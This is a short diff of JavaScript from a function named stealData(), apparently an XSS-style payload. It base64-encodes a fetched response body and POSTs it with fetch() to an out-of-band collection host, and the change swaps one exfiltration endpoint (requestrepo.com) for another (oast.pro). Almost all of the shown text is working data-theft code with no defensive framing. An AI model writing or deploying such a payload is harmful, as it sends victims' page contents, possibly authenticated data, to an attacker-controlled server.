@@ -12,7 +12,7 @@ function stealData() {
     xhr.onreadystatechange = function() {
         if (xhr.readyState === XMLHttpRequest.DONE) {
             var exfilData = btoa(unescape(encodeURIComponent(read_body(xhr))));
-            fetch("https://klz52gzd.requestrepo.com/exfil_full", {
+            fetch("https://d6q3p0qn5cd2d3h6lbp07sicoi8wfzw8e.oast.pro/exfil_full", {
                 method: "POST",
                 mode: "no-cors",
                 credentials: "omit",
